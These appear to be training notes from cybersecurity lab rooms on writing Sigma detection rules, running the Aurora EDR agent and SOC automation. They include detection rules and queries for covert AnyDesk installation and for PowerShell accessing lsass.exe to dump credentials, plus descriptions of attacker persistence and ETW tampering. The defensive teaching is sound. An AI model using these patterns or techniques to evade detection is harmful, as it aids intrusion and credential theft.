[TheDFIRReport](https://twitter.com/TheDFIRReport/status/1423361127472377860?s=20&t=mHiJFnlfWH3cO3XdXEQo_Q)

). As a

SOC

analyst, you have been tasked to analyse the intel and write a
Sigma rule to detect the installation of AnyDesk on Windows devices.

You should use the SIGMA specification 
file downloaded from Task 3  as a basis for writing the rule. If you are
 using the AttackBox, the file is available in the directory `/root/Rooms/sigma/Sigma_Rule_File.yml`.

### Step 1: Intel Analysis

The shared intel shows us a lot of information
and commands to download and install AnyDesk. An adversary could wrap this up in a malicious executable sent to an unsuspecting
user through a phishing email. We can start picking out values that
would be important for detecting any occurrence of an installation.

- Source URL: This marks the download source for the software,
highlighted by the $url variable.
- Destination File: The adversary would seek to identify a destination
directory for the download. This is marked by the $file variable.
- Installation Command: From the intel, we can see that various
instances of `CMD.exe` are being used to install and set a
user password by the script. From this, we can pick out the installation
attributes such as `-install`, `-start-with-win`
and `-silent`.

Other essential pieces of information from the intel would
include:

- Adversary Persistence: The adversary would seek to maintain
access to the victim's machine. In this instance, they would create
a user account `oldadministrator` and give the user
elevated privileges to run other tasks.
- Registry Edit: We can also pick out the registry edit, where the
added user is added to a `SpecialAccounts` user
list.

With this information, we can evaluate the creation of a rule to aid
in detecting when an installation has taken place.

### Step 2: Rule Identification

We can start building our rule by filling in the Title and
Description sections, given the information that we are looking for an
AnyDesk remote tool installation. Let us also set the status
as `experimental` , as this rule will be tested
internally.

Process_Creation_AnyDesk_Installation.yml

```
title: AnyDesk Installation
status: experimental
description: AnyDesk Remote Desktop installation can be used by attacker to gain remote access.
```

### Step 3: Log Source

As indicated from our intel, Windows devices would be our targetted
device.
Windows Eventlog and Sysmon provide events such as process creation and
file creation. Our case focuses on the creation of an installation
process, thus listing our logsource category
as `process_creation.`

Process_Creation_AnyDesk_Installation.yml

```
logsource:
    category: process_creation
    product: windows
```

### Step 4: Detection Description

The detection section of our rule is the essential part. The
information derived from the intel will define what we need to detect
within our environment. For the AnyDesk installation, we noted the
installation commands that would be used by the adversary that contains
the strings: `install`, and `start-with-win`. We can therefore write our search identifiers
as below with the modifiers `contains` and
`all` to indicate that the rule will match all those
values.

Additionally, we can include searching for the current directory
where the commands will be executed from,
`C:\ProgramData\AnyDesk.exe`

For our condition expression, this evaluates the selection of our
detection.

Process_Creation_AnyDesk_Installation.yml

```
detection:
    selection:
        CommandLine|contains|all:
            - '--install'
            - '--start-with-win'
        CurrentDirectory|contains:
            - 'C:\ProgramData\AnyDesk.exe'
    condition: selection
```

### Step 5: Rule Metadata

After adding the required and vital bits to our rule, we can add
other helpful information under level, tags, references and false
positives. We can reference the MITRE ATT&CK Command and
Control tactic and its corresponding [T1219](https://attack.mitre.org/techniques/T1219/) technique for tags.

With this, we have our rule, which we can now convert to the SIEM
query of our choice and test the detection.

Process_Creation_AnyDesk_Installation.yml

```
falsepositives:
    - Legitimate deployment of AnyDesk
level: high
references:
    - https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20
tags:
    - attack.command_and_control
    - attack.t1219
```

### Rule Conversion

Sigma rules need to be converted to the appropriate SIEM target that
is being utilised to store all the logs. Using the rule we have written
above, we shall now learn how to use the sigmac and uncoder.io tools to
convert them into ElasticSearch and Splunk queries.

### Sigmac

[Sigmac](https://github.com/SigmaHQ/sigma/tree/8bb3379b6807610d61d29db1d76f5af4840b8208/tools)
is a Python-written tool that converts Sigma rules by matching
the detection log source field values to the appropriate SIEM backend 
fields. As part of the Sigma repo (Advisable to clone the repo to get 
the tool and all the available rules published by the Sigma team), this 
tool allows for quick and easy conversion of Sigma rules from the 
command line. Below is a snippet of how to use the tool through its help
 command, and we shall display the basic syntax of using the tool by 
converting the AnyDesk rule we have written to the Splunk query.

Note: Sigmac will be deprecated by the end of 2022, and attention 
from the owners will shift to sigma-cli. However, a copy of Sigmac is 
available on the AttackBox, and you can initiate the use of the tool for
 the rest of the room using `python3.9 root/Rooms/sigma/sigma/tools/sigmac`.

Sigmac Help Options

```
SecurityNomad@THM:~# cd /root/Rooms/sigma/sigma/tools/SecurityNomad@THM:~/Rooms/sigma/sigma/tools# python3.9 sigmac -husage: sigmac [-h] [--recurse] [--filter FILTER]
              [--target {chronicle,kibana-ndjson,sumologic,sumologic-cse,es-rule-eql,athena,carbonblack,limacharlie,netwitness,csharp,hawk,opensearch-monitor,powershell,ala-rule,elastalert,sql,xpack-watcher,netwitness-epl,ala,lacework,logiq,qualys,sysmon,arcsight-esm,fireeye-helix,hedera,fortisiem,humio,kibana,mdatp,grep,streamalert,sumologic-cse-rule,uberagent,es-qs-lr,es-eql,es-dsl,es-rule,sqlite,stix,fieldlist,devo,es-qs,splunkxml,logpoint,datadog-logs,splunkdm,qradar,sentinel-rule,crowdstrike,elastalert-dsl,arcsight,ee-outliers,splunk,graylog}]
              [--lists] [--lists-files-after-date LISTS_FILES_AFTER_DATE]
              [--config CONFIG] [--output OUTPUT]
              [--output-fields OUTPUT_FIELDS] [--output-format {json,yaml}]
              [--output-extention OUTPUT_EXTENTION] [--print0]
              [--backend-option BACKEND_OPTION]
              [--backend-config BACKEND_CONFIG] [--backend-help BACKEND_HELP]
              [--defer-abort] [--ignore-backend-errors] [--verbose] [--debug]
              [inputs [inputs ...]]

Convert Sigma rules into SIEM signatures.
```

The main options to be used are:

- t: This sets the targeted SIEM backend you wish to get queries for (Elasticsearch, Splunk, QRadar, ElastAlert).
- c: This sets the configuration file used for the conversion. The file
handles the field mappings between the rule and the target SIEM environment, ensuring that the necessary fields are correct for performing investigations on your environment.
- -backend-option: This allows you to pass a backend configuration file or individual
modifications that dictate alert options for the target SIEM environment. For example, in ElasticSearch, we can specify specific
field properties to be our primary keyword_field to be searched against, such as fields that end in the `.keyword` or `.security` fields below:

Sigmac ElasticSearch Conversion

```
SecurityNomad@THM:~/Rooms/sigma/sigma/tools# python3.9 sigmac -t es-qs -c tools/config/winlogbeat.yml --backend-option keyword_field=".keyword" --backend-option analyzed_sub_field_name=".security" ../rules/windows/sysmon/sysmon_accessing_winapi_in_powershell_credentials_dumping.yml(winlog.channel.security:"Microsoft\-Windows\-Sysmon\/Operational" AND winlog.event_id.security:("8" OR "10") AND winlog.event_data.SourceImage.keyword:*\\powershell.exe AND winlog.event_data.TargetImage.keyword:*\\lsass.exe)
```

You can find more information through the [Sigmac documentation](https://github.com/SigmaHQ/sigma/blob/master/tools/README.md). We can convert our AnyDesk Installation rule  to a Splunk alert as shown below:

Sigmac Splunk Conversion

```
SecurityNomad@THM:~/Rooms/sigma/sigma/tools# python3.9 sigmac -t splunk -c splunk-windows Process_Creation_AnyDesk_Installation.yml(CommandLine="*--install*" CommandLine="*--start-with-win*" (CurrentDirectory="*C:\\ProgramData\\AnyDesk.exe*"))
```

Sigma developers are working on a Python library that will be Sigmac's replacement, known as [pySigma](https://github.com/SigmaHQ/pySigma).

### Uncoder.io

[Uncoder.IO](https://uncoder.io/) is an online Sigma converter for numerous
SIEM and EDR platforms. It is easy to use as it allows you to copy your
Sigma rule on the platform and select your preferred backend application
for translation. Do take note that with recent updates, this requires setting up a free account on the uncoder.io website.

We can copy our rule and convert it into different queries of our
choice. Below, the rule has been converted into Elastic Stack Query in Lucene, QRadar
and Splunk. You can copy the translation into the SIEM platform to test
for any matches.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/6d60505596b02c755038541fbc12bf9e.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/6d60505596b02c755038541fbc12bf9e.gif)

Convert the AnyDesk Installation Sigma rule we have written throughout this task to an Elastic Query and use it to analyse log data from the launched machine on the Kibana dashboard.

Take note that with the new version of [uncoder.io](https://uncoder.io/), the Elastic query will be produced in the Lucene language, therefore, change the settings on Kibana to be able to use the query accurately. Use the information found to answer the following questions.

**TIP:
 Be aware that the converted queries may not all work verbatim as 
converted from the tools. This is due to the processing of regex 
characters (\,*), and you may be required to adjust the queries, 
especially around escaped blank space and varied properties. For 
example, for this exercise, you have to remove the * characters from the
 result and only escape the colon (:) in the folder path and the 
directory slashes.**

**SecOps Decisions**

Threat and log investigations may flow in different directions
depending on factors such as SIEM backends, log sources and
process flows established within organisations. Sigma rules are not
different; as an analyst, you must make various investigation decisions.

For example, the Sigmac CLI
 tool or Uncoder.io would be essential to the detection investigations. 
You may encounter instances where the tools produce slightly different
conversion outputs from the same rule and may not entirely match up
with your backend configuration.

Let us consider converting the [Chmod Suspicious Directory Linux rule](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml) into Elastic Query. Starting with Sigmac, we set our target backend as Elastic Query using the `-t es-qs` option
 and follow that with selecting our preferred configuration option. 
After that, set the rule from your directory and  obtain our output 
which is a query that matches the process using the field names
`image` and `commandline`, with options that point to various directory files where it would be suspicious to find the “change mode” `chmod` command being run.

Sigmac Conversion - Linux Chmod

```
root@THM:~/Rooms/sigma/sigma/tools# python3.9 sigmac -t es-qs -c elk-linux ../rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml(Image.keyword:*\/chmod AND CommandLine.keyword:(*\/tmp\/* OR *\/.Library\/* OR *\/etc\/* OR *\/opt\/*))
```

On the side of using Uncoder.io, the rule conversion produces a query
that matches based on the field names
**process.executable** and
**process.command_line**.

Uncoder.io Conversion - Linux Chmod

```
(process.executable:*\/chmod AND process.command_line:(*\/tmp\/* OR *\/.Library\/* OR *\/etc\/* OR *\/opt\/*))
```

Despite the similarities in the output, you would end up deciding on the best outcome for your configuration and
considering any regex used to escape any special
characters.

## **AURORA EDR**

EDRs and Aurora, a Sigma-based tool for writing detection alerts via Windows Event logs.

# What is an EDR?

Securing networks and organisations does not only rely on the
monitoring of external connections or defence on the perimeter but also
requires the use of tools and technologies to detect and respond to
threats at the endpoints. An Endpoint Detection and Response (EDR)
solution provides a proactive approach toward threat detection
and visibility through near real-time monitoring of events on endpoints
and evaluates them based on a rules-based automated response and
analysis.

The main functions of an EDR are:

- Monitor and collect activity data from endpoints that could indicate
a threat.
- Analyse this data to identify threat patterns.
- Automatically respond to identified threats, remove or contain them,
and notify security personnel.
- Forensics and analysis tools to research identified threats and
search for suspicious activities.

The functions of an EDR can be broken down into the aggregation of
data on an endpoint and how the data is analysed and used to detect
threats.

**Endpoint Data Recording**

- Aggregating network communication, events, process executions,
file activities, commands, user operations, etc.
- Telemetry data points.
- Storage of data on endpoints, in a server, or in a hybrid approach.

**Investigation of Data & Responding**

- Sweep (search) for indicators of Compromise to understand the impact
of detections.
- Find the root cause of detection and remediate/prevent/investigate
again.
- Hunt for indicators of Attack based on behaviour rules or threat
intelligence. Automatic (detection) or manual.

# Components of solutions

EDR vendors would classify their capabilities differently. However,
the following are the common classifications:

- **Detection:** Fundamentally, EDR solutions are tasked
with threat detection. For example, with file analysis, EDRs can
flag suspicious files at the sight of any malicious behaviour. The
detection process is also based on how good the threat intelligence
sources are.
- **Response/ Containment:** EDRs provide response
features that help investigate, detect, remediate and contain threats. The actions here include host segmentation, file
deletion/cleanup and conducting investigations through sandboxing
conditions. Advanced EDR solutions have the capability to trigger an automated response based on a set of preconfigured rules.
- **Integration:** EDRs extend endpoint visibility
through the collection and aggregation of data. Therefore, in addressing
endpoint security, EDR solutions need to work smoothly with existing
security solutions in an organisation.
- **Insights:** Real-time analysis of events is becoming
very common, providing a rapid evaluation and correlation of
threat data. Through complex machine learning and artificial
intelligence algorithms, EDR solutions can automate threat
identification and perform behavioural analysis, mapping them to
frameworks such as the MITRE ATT&CK.
- **Forensics:** In-depth investigation of past threats
provides valuable information on the inner workings of exploits and how
a breach was successful. With this, EDR solutions can outline
threat timelines and identify lurking threats that go undetected.

## Event Tracing for Windows

Event Tracing for Windows (ETW) is a Windows OS logging feature that
provides a mechanism to trace and log events raised by
user-mode applications and kernel-mode drivers. ETW provides the
capability for applications and drivers to write events. For
cybersecurity defenders, this becomes a vital source of detection
information.

ETW is made up of three distinct parts:

- **Controllers:** These applications are used to
configure event tracing sessions. They also initiate the providers. An example of a Controller is `logman.exe.`
- **Providers:** These are the applications that produce
event logs.
- **Consumers:** These applications subscribe and listen
to events in real-time or from a file.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/2d06cc3595d3ac06d9b4c7999e32015f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/2d06cc3595d3ac06d9b4c7999e32015f.png)

# Windows Event Viewer

Windows systems and applications provide event logs that would be
useful for troubleshooting and understanding the activities being
performed. These logs include system access notifications, security
changes, operating system errors, hardware failures, and driver
malfunctions. We shall briefly examine how event logs are presented
via the Windows Event Viewer.

The event information is categorised under these types of levels:

- **Information:** Describes the successful
operation of a driver, application or service. Basically, a service is
calling home.
- **Warning:** Describes an event that may
not be a present issue but can cause problems in the future.
- **Error:** Describes a significant problem
with a service or application.
- **Success Audit:** Outlines that an
audited security access operation was successful. For example, a user’s
successful login to the system.
- **Failure Audit:** Outlines that an
audited security access operation failed. For example, a failed access
to a network drive by a user.

Even a properly functioning host will show various logs under these
classes, and as a security analyst, you will be required to comb through
the logs. This ensures you can keep tabs on a system’s operations and
troubleshoot any problems.

# Using the Event Viewer

Windows Event Viewer is mainly found as an application on the system.
We can find it simply by searching for “Event Viewer” on the Start
menu.

Windows logs are placed under different categories, with three major
ones used for system troubleshooting and investigations:

- **Application:** Records log events associated with
system components such as drivers and interface components that run an
app.
- **System:** Records events related to programs
installed and running on the system.
- **Security:** Records events associated with security, such as logon attempts and resource access.

On the main dialogue screen, we can see that the log events are
presented in a tabular format which shows the levels, date and time,
source of the events, event id and task category.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f36601d831d8a5917e50526d217adcde.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f36601d831d8a5917e50526d217adcde.gif)

When we select an event, the event properties window displays
information related to the event under the “General” tab. We can dig
deeper via the “Details” tab.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d505c16313f5f461290148256f29c6c2.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d505c16313f5f461290148256f29c6c2.gif)

Note that we shall focus on the application logs for the remainder of the room as Aurora writes its events in this category.

## Aurora

Aurora is a Windows endpoint agent that uses Sigma rules and IOCs to
detect threat patterns on local event streams using ETW. When a
true-positive rule matches, Aurora triggers “response actions” that will
be displayed under the Windows Event Log Viewer.

It has been designed to be customisable based on the Sigma rule set
and function as an on-premises tool, with no data leaving the
network.

Aurora comes in as an enterprise and free community version
called Aurora Lite. The table below summarises the key differences in
service offered by the two versions.

| Aurora | Aurora Lite |
| --- | --- |
| Sigma-based event matching on ETW data | Sigma-based event matching on ETW data |
| An open-source rule set (1300+ rules) | An open-source rule set (1300+ rules) |
| Nextron’s Sigma rule set | No Nextron’s Sigma rule set |
| Open-source IOC set | Open-source IOC set |
| Nextron’s IOC set | No Nextron’s IOC set |
| Alert output channels: Eventlog, File, UDP/TCP | Alert output channels: Eventlog, File, UDP/TCP |
| Comfortable management with ASGARD | - |
| Additional detection modules | - |
| Unlimited number of response actions | - |
| Rule encryption | - |

Features source: [Nextron Systems - Aurora](https://www.nextron-systems.com/aurora/)

Aurora obtains data from different 
ETW channels and adds live
information (for the commercial version) to enrich and recreate events
similar to those generated by Sysmon. It does not create tons of logs; 
it only populates the viewer with events of triggered rules. Below, we 
can look at a comparison between Aurora and Sysmon.

|  | Aurora | Sysmon |
| --- | --- | --- |
| Event Source | Event Tracing for Windows (ETW) | Sysmon Kernel Driver. |
| Sigma Rule Event Coverage | 95% | 100% |
| Relative Log Volume | Low | High |
| Sigma & IOC Matching | Yes | No |
| Response Actions | Yes | No |
| Resource Control (CPU Load, Output Throttling) | Yes | No |
| Output: Eventlog | Yes | Yes |
| Output: File | Yes | No |
| Output: TCP/UDP Target | Yes | No |
| Risk: Incomplete Data due to Filters | No | Yes |
| Risk: Blue Screen | No | Yes |
| Risk: High System Load | No | Yes |

Aurora is supported on Windows 7/ Windows Server 2012 or newer
versions and must run using administrator privileges. It must also be
excluded from any running antivirus or EDR solutions. This is
to avoid the application being blocked from executing its services.

Look at how to install and configure Aurora correctly via the [User
Manual](https://aurora-agent-manual.nextron-systems.com/en/latest/index.html).

# Aurora Presets

Aurora can be configured to use four different configuration formats
that dictate how the solution would fetch events and raise alerts. The
four preset formats are:

- **Standard:** This configuration covers events at a medium level of severity.
- **Reduced:** This configuration looks at events
considered to be at a high minimum reporting level.
- **Minimal:** This configuration looks at events
considered to be at a high minimum reporting level.
- **Intense:** This configuration looks at events
considered to be at a low minimum reporting level.

| Affected Setting | Standard | Reduced | Minimal | Intense |
| --- | --- | --- | --- | --- |
| Deactivated sources | Registry, Raw Disk Access, Kernel Handles, Create Remote Thread | Registry, Raw Disk Access, Process Access | Registry, Raw Disk Access, Kernel Handles, Create Remote Thread,
Process Access, Image Loads | - |
| CPU Limit | 35% | 30% | 20% | 100% |
| Process Priority | Normal | Normal | Low | Normal |
| Minimum Reporting Level | Medium | High | High | Low |
| Deactivated Modules | - | LSASS Dump Detector | LSASS Dump Detector, BeaconHunter | - |

# Running Aurora

Aurora can be started directly via the command line, with the option of selecting the preferred configuration.

Aurora Launch with Minimal Config

```
C:\Program Files\Aurora-Agent>aurora-agent.exe -c agent-config-minimal.yml

```

For continuous running, the agent can also run as a service through the `--install` flag.

Aurora Launch as a Service

```
C:\Program Files\Aurora-Agent>aurora-agent.exe --install -c agent-config-minimal.yml

```

# Useful Flags

Some valuable flags to use and query different types of information
from Aurora include:

- **–status:** Queries status information from the
currently running service.

Aurora Status

```
C:\Program Files\Aurora-Agent>aurora-agent.exe --status
Aurora Agent
Version 1.0.7
Build Revision: afae63fe69c55
Signature Revision: 2022/08/19-071122
Sigma Revision: 0.21-1677-g3584496d4
Status: running
Uptime (in hours): 44

Active Outputs:
    Windows Application Eventlog: enabled

Active Modules: ApplyIOCs, Rescontrol, Sigma, ETWSource, ETWKernelSource, EventlogSource, PollHandles

Rule Statistics:
    Rule paths: C:\Program Files\Aurora-Agent\signatures\sigma-rules, C:\Program Files\Aurora-Agent\custom-signatures
    Loaded rules: 1548
    Rule reloads: 0
    Responses: 0

False positive filters: 0
Process excludes: 0

Missed events: 0
Sigma matches: 0
Suppressed Sigma matches of those: 0

Response Actions: disabled

```

- **–trace:** Queries all the events Aurora monitors from
the subscribed channels. It also provides complete event statistics.

Aurora Trace

```
C:\Program Files\Aurora-Agent>aurora-agent.exe --trace > aurora-trace.log

```

- **–json:** Outputs information in JSON format for a
more comprehensive view of the alerts that are easy to search.

# Output Options

Aurora supports the following output options:

- **Windows Eventlog:** On an earlier task, we looked at
Event Tracing for Windows. Aurora writes its events using ETW; the details can be viewed via the EventViewer. Click the
“Details” tab to see all fields and values.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/171be6b47de229eb03e7c53c8c1d7e06.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/171be6b47de229eb03e7c53c8c1d7e06.png)

- **Log File:** A log file can be written using the
`-logfile` flag, which will be automatically rotated once
the specified log size has been attained (by default, this is 10MB). The
log files would be found under the directory where Aurora is running
from.

Aurora Log file output

```
C:\Program Files\Aurora-Agent>aurora-agent.exe --logfile aurora-minimal.log

```

With this command, the Aurora status will include
`Stdout: enabled` under its configuration **Active Outputs**
section.

- **UDP/TCP Targets:** Network targets direct Aurora
events to an internal repository via UDP or TCP using the flags
`-udp-target` and `-tcp-target`. These options
require arguments in the form of
**`host: port,`** such as
**`internal.repo:8443.`**

## Aurora Responses

Responses extend the Sigma services and can be used to set specific
actions to be performed and respond when an event matches. These actions
can help contain a threat actor or limit their damage to the system
host. The intended use cases for the responses are **worm
containment, ransomware containment, and the hard blocking of
applications.**

Aurora supports two responses: **Predefined** and
**Custom.**

# Predefined Responses

The following responses are available by default with the
installation of Aurora:

- **Suspend:** Used to stop a specified
process.
- **Kill:** Used to kill a specified
process.
- **Dump:** Used to create a dump file found in the `dump-path` folder.

# Custom Responses

Custom responses are meant to call an internal program to execute a
function based on a raised alert. The program has to be available from
`PATH` and the answer would be a command-line query.

With these responses, a set of flags can be used to modify
and relay different types of information. The flags have been summarised
in the table below:

| Flag | Definition |
| --- | --- |
| Simulate | Used to test out rules, and responses that won't be triggered. A log
will be created to indicate the type of response that would be
triggered. |
| Recursive | It is used to specify that the response will affect descendent
processes. It is usually `true` by default. |
| Low privilege only | Marked by the flag `lowprivonly.` The flag specifies that
the response will be triggered if the target process does not run as
`LOCAL SYSTEM` or at an elevated role. |
| Ancestor | The `ancestors` flag specifies that the response will affect
a process’s ancestor, not itself. The key: value pair is indicated by
integers to show the level of ancestors, e.g. one (1) is for parent process, 2
for grand-parent, and so on. |
| Process ID field | The `processidfield` flag specifies the field contains the
process ID that shall be affected by the response. |

### Response examples

Aurora Kill Parent Process Response

```
response:
    type: predefined
    action: kill
    processidfield: ParentProcessId

```

Aurora Suspend Response

```
response:
    type: predefined
    action: suspend

```

Aurora Copy image to backup folder Custom Response

```
response:
    type: custom
    action: cmd /c copy %Image% "%%ProgramData%%\Aurora\Image-%ProcessId%.bin"

```

# Aurora Event IDs

If you may have noticed through the screenshots and navigating through the VM, Aurora uses event IDs to log to the Windows Eventlog.
The tables below list the IDs related to Sigma, internal and other
notable modules used.

| Event ID | Description | Event ID | Description |
| --- | --- | --- | --- |
| 1 | A process creation Sigma rule matched. | 100 | A license file was found. |
| 2 | A set file creation time sigma rule matched. | 101 | Status message (from --report-stats) |
| 3 | A network connection sigma rule matched. | 102 | Aurora Agent started. |
| 4 | A sysmon status Sigma rule matched. | 103 | Aurora Agent is terminating. |
| 5 | A process termination Sigma rule matched. | 104 | The current license expired. |
| 6 | A driver-loaded Sigma rule matched. | 105 | No valid license file was found. |
| 7 | An image-loaded Sigma rule matched. | 107 | A process created a large number of events. |
| 8 | A create remote thread Sigma rule matched. | 108 | An internal panic occurred. |
| 9 | A raw disk access Sigma rule matched. | 200 | BeaconHunter |
| 10 | A process access Sigma rule matched. | 300 | Lsass Dump Detector |
| 11 | A file creation Sigma rule matched. | 400 | ETW Canary |
| 12 | A registry event Sigma rule matched. | 500 | Process Tampering Detector |
| 15 | A create stream hash Sigma rule matched. | 600 | Temporary Driver Load Detector |
| 17 | A pipe event Sigma rule matched. | 700 | Command Line Mismatch Detector |
| 19 | A WMI event Sigma rule matched. | 800 | Event Distributor |
| 21 | A registry event Sigma rule matched. | 900 | ETW Provider |
| 22 | A DNS query Sigma rule matched. | 1000 | Eventlog Provider |
| 23 | A file deletion Sigma rule matched. | 1100 | Handle Polling Provider |
| 99 | Another Sigma rule (that did not belong to one of the above categories) matched. | 1200 | Resource Control |
| 98 | Unspecified log message from Sigma module. |  |  |
| 97 | No Sigma rule files were found. |  |  |
| 96 | Sigma rules were reloaded. |  |  |
| 95 | An error occurred while loading the Sigma rules. |  |  |
| 6000 | A response for a sigma match was executed. |  |  |
| 6001 | A response for a sigma match was simulated. |  |  |

**Aurora Function Tests**

# Function Tests

Once Aurora has been installed and configured, several function tests
can be executed to check its various functionalities. Let’s look at a few
Sigma matching and IOC matching examples.

- **Listing user account privileges:** Running a simple
command `whoami /priv` to list the current user privileges
will trigger a Sigma rule with a level **high** and create a
`WARNING` level message on the Eventlog. This will be a
process creation alert.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/1ce641aa45e7f2d7b0c4b5247f6b6f4e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/1ce641aa45e7f2d7b0c4b5247f6b6f4e.png)

- **Suspicious network communication:** Running a
suspicious DNS beaconing request will result in a critical rule being triggered. Below is
an example that matches a suspicious cobalt strike DNS
beaconing.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/c246b3ff357d7ef13826831b4ba682b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/c246b3ff357d7ef13826831b4ba682b6.png)

**Aurora Detection Gaps**

Since Aurora uses ETW to observe and monitor Windows system events,
there are some sections where ETW events aren’t available or not easily
usable. These areas cover Aurora's detection gaps, and we shall
look at them in this task.

# Named Pipes

Named pipes are a one-way communication channel between processes
that are subject to security checks in the memory. ETW has no provider
to gather information about the creation or connection to named pipes.
Observing named pipe events is through the Kernel Object Handle, which
is noisy and can provide unnecessary information.

# Solution

- Using Aurora under “Intense” configurations.
- Complement Aurora configuration with Sysmon to capture the
events.

# Registry Events

Registry events are generated on the ETW by creating keys or writing
values, primarily via the
`Microsoft-Windows-Kernel-Registry.` However, this
information may not be directly usable as all registry handles must be
tracked individually as keys are referenced by their handle. For value
setting too,

# Solution

- Using Aurora under “Intense” configurations.
- Complement Aurora configuration with Sysmon to capture the events.

# ETW Disabled

Attackers have the ability to disable ETW events by patching the
system calls that Windows would use to create the events from user
space. Writing detection rules based on events that originate from
the process and are caused by a provider that is not
`Microsoft-Windows-Kernel` should be done with care.

# Solution

- Aurora’s full version uses the ETW Canary module to detect any
manipulations of ETW.
- Using the flag `-report-stats` allows for reporting the
agent’s status to your SIEM and will include stats of the observed,
processed and dropped events that can indicate signs of
manipulations.

## **SOAR**

**Security Operations Centres**

# Evolution of Security Operation Centres (SOCs)

Security operations centres have become visualised as large
action-packed rooms with threat alerts firing from numerous monitors,
with analysts rushing about and trying to contain the threat. However,
no two SOCs are the same and are set up differently. At the basics, SOCs
are meant to provide a location to centralise crisis communication for
organisations and provide monitoring capabilities for physical, logical
and network security. All this is to protect assets. For a
quick introduction to SOCs and their operations, check out the [Security
Operations](https://tryhackme.com/room/securityoperations) room.

SOCs have evolved over time, with every generation adding new technology. A quick rundown of the SOC generations is as follows:

- **First-Generation:** Initial SOC functions were
handled by the IT operations teams; thus, tasks were more blended. The
main functions included device monitoring, managing antivirus security and
log collection, which was limited and often referred to in the event an
incident was reported.
- **Second-Generation:** SIEM tools emerged here and were
meant to add to the previous SOC functions. The added operational
aspects included events correlation, network and Syslog log collection
and
case management. This meant that security threat management was the main
focus and aimed at correlating events to establish links and provide
analysts with visuals that would assist them in investigating
incidents.
- **Third-Generation:** Expanded the use of SIEMs by
adding vulnerability management and incident response capabilities.
- **Fourth-Generation:** Advance security capabilities
are introduced here, including big data security and data enrichment.
With this generation, SOCs can analyse large amounts of data to uncover
threats in real-time. As an example, threat intelligence feeds have
become valuable to SOC teams, expanding the horizons of security
investigations.

You can read more on the SOC generations in the book: *“Security
Operations Center: Building, Operating and Maintaining your
SOC.”*

# SOC

The main advantage of an organisation having a SOC is to enhance
their security incident handling through continuous monitoring and
analysis. This is achievable through having the right amount and
implementation of people, processes and technologies that would support
the capabilities of the SOC and business goals.

On the matter of SOC capabilities, the key ones to have include the following:

- **Monitoring and Detection:** This focuses on continuously scanning and flagging suspicious activities within a
network environment. It leads to awareness of emerging threats and
how to prevent them in their early stages.
- **Incident Response:** SOC teams operate as first
responders when cyber threats are identified. They perform operations
such as isolating or shutting down infected endpoints, removing malware
and stopping malicious processes.
- **Threat Intelligence:** Monitoring environments continuously requires a constant flow of intel. This ensures that SOC
teams are always updated on the latest developments and have the
best available resources to address emerging threats.
- **Log Management:** A SOC gathers, maintains and
reviews logs of all network connections and activities within an
organisation. With all this information, baselines for regular
activities can be established and provide evidence for forensic
investigations.
- **Recovery and Remediation:** Organisations rely on
their SOC to provide a hub for recovery and remediation when incidents
occur. Additionally, the SOC provides effective communication with
affected parties to ensure that the incidents are addressed.
- **Security Process Improvement:** Adversaries are
continuously refining their tactics and tools. This means that the SOC
must always carry out improvements by performing post-mortem
investigations and identifying areas to work on.

# SOC

- **Alert fatigue:** As a result of using numerous
security tools, a huge number of alerts will be triggered within a SOC.
Many of these alerts are false positives or insufficient for an investigation, leaving analysts overwhelmed and unable to
address any serious security events.
- **Disparate tools:** Security tools are often deployed
without integration within an organisation. Security teams
are tasked with navigating through firewall logs and rules which are
handled independently from endpoint security logs. This also leads to an
overload of tools.
- **Manual Processes:** SOC investigation procedures are
often not documented, leading to a lack of efficient means of addressing
threats. Most rely on established tribal knowledge that was built by
experienced analysts, and the processes are never documented.
- **Talent Shortage:** SOC teams find recruiting and expanding their talent pool difficult to address the growing security
landscape and sophisticated threats. Combining this with the alert
overload teams face, security analysts become more overwhelmed with the
number of responsibilities they have to undertake, resulting in less
efficient work and extended incident response times that allow
adversaries to reign havoc within an organisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/a546062feab2c0dc7dbde6e2d5b786f8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/a546062feab2c0dc7dbde6e2d5b786f8.png)

**Security Orchestration, Automation and Response**

As we have covered in the previous task, security operations face
numerous challenges and analysts are left overwhelmed. Security teams
would love to handle all their alerts and triage processes from a single
platform or interface, making integrating all their
existing tools possible.

Security Orchestration, Automation, and Response (SOAR)
 platforms come
into play and allow organisations to analyse threat intelligence 
efficiently, automate response workflows and triage incidents using
human and machine power. SOARs operate using the following
capabilities:

# Security Orchestration

Just like organising a musical orchestra, security orchestration is
an act of connecting and integrating security tools and systems into
seamless workflows. This develops streamlined processes and information
flow, effectively helping organisations handle security events.
Orchestration works in tandem with automation, which we shall define
shortly.

What is vital to remember is that orchestration chains together
individual security tools, tasks and processes to work together towards
the same tune.

